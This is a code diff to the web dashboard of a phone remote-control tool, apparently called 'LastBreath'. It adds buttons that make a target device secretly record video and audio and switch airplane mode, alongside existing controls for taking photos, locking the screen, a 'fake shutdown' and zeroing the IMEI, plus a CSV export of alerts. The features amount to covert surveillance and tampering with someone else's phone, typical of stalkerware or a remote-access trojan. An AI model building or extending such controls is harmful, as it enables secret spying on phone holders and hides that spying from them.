@@ -66,7 +66,7 @@
             <option value="">-- Select a Device to Control --</option>
         </select>
 
-        <!-- Standard Buttons -->
+                <!-- Standard Buttons -->
         <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 15px;">
             <button class="btn" style="background:#ffaa00; color:#000;" onclick="sendCommand('torch_on')">🔦 Torch ON</button>
             <button class="btn btn-primary" onclick="sendCommand('torch_off')">🔦 Torch OFF</button>
@@ -74,6 +74,9 @@
             <button class="btn btn-danger" onclick="sendCommand('strobe')" style="background:#9c27b0;">🚨 Screen Strobe</button>
             <button class="btn btn-danger" onclick="sendCommand('hard_lock')">🔒 Lock Screen</button>
             <button class="btn btn-danger" onclick="sendCommand('capture')">📷 Take Photo</button>
+            <button class="btn btn-danger" onclick="sendCommand('record_video')" style="background:#e91e63;">🎥 Record Video</button>
+            <!-- NEW AUDIO RECORDING BUTTON -->
+            <button class="btn btn-danger" onclick="sendCommand('record_audio')" style="background:#ff5722;">🎙️ Record Audio</button>
             <button class="btn btn-danger" onclick="sendCommand('fake_shutdown')">🪫 Fake Shutdown</button>
         </div>
 
@@ -84,6 +87,8 @@
             <button class="btn" style="background:#555; color:#fff;" onclick="sendCommand('wifi_off')">📶 Wi-Fi OFF</button>
             <button class="btn" style="background:#555; color:#fff;" onclick="sendCommand('data_on')">🌐 Data ON</button>
             <button class="btn" style="background:#555; color:#fff;" onclick="sendCommand('data_off')">🌐 Data OFF</button>
+            <button class="btn" style="background:#555; color:#fff;" onclick="sendCommand('airplane_on')">✈️ Airplane ON</button>
+            <button class="btn" style="background:#555; color:#fff;" onclick="sendCommand('airplane_off')">✈️ Airplane OFF</button>
             <button class="btn" style="background:#555; color:#fff;" onclick="sendCommand('imei_zero')">🛑 Zero IMEI</button>
         </div>
 
@@ -100,10 +105,11 @@
     <div class="section-title">🖥️ Live Server Logs</div>
     <div id="liveLogs">Waiting for logs...</div>
 
-    <div style="margin-bottom:20px;display:flex;gap:10px;flex-wrap:wrap;">
+        <div style="margin-bottom:20px;display:flex;gap:10px;flex-wrap:wrap;">
         <button class="btn btn-primary" onclick="refreshData()">🔄 Refresh</button>
         <button class="btn btn-primary" onclick="showAddDevice()">📱 Add Device</button>
         <button class="btn btn-primary" onclick="showAddContact()">👤 Add Contact</button>
+        <button class="btn btn-success" onclick="exportAlerts()">📥 Export Logs (CSV)</button>
     </div>
     
     <div style="display:flex;gap:20px;border-bottom:1px solid #2a2a2a;margin-bottom:20px;">
@@ -204,6 +210,26 @@ function loadStats() {
             document.getElementById('statBlacklisted').textContent = d.stats.blacklisted || 0;   // ← NEW LINE
         }
     }).catch(e=>console.error(e));
+}
+function exportAlerts() {
+    if (!confirm("Download current alerts as a CSV file?")) return;
+    
+    fetch(API_URL+'/alerts', { headers: getHeaders() })
+    .then(r => r.json()).then(d => {
+        if (!d.success || d.alerts.length === 0) { alert("No alerts to export."); return; }
+        
+        let csv = "IMEI,Alert Type,Message,Date\n";
+        d.alerts.forEach(a => {
+            csv += `"${a.imei}","${a.alert_type}","${a.message}","${a.created_at}"\n`;
+        });
+        
+        const blob = new Blob([csv], { type: 'text/csv' });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.setAttribute('href', url);
+        a.setAttribute('download', 'LastBreath_Logs.csv');
+        a.click();
+    });
 }
 
 function loadDevices() {
